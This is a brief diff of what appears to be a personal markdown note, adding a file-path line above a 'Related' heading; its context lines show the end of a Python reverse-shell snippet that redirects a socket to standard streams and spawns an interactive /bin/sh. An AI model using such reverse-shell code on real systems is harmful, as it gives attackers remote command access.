@@ -8,6 +8,8 @@ os.dup2(s.fileno(),2)
 p=subprocess.call(["/bin/sh","-i"])
 ```
 
+` zet/20221003150561/README.md `
+
 # Related
 
 
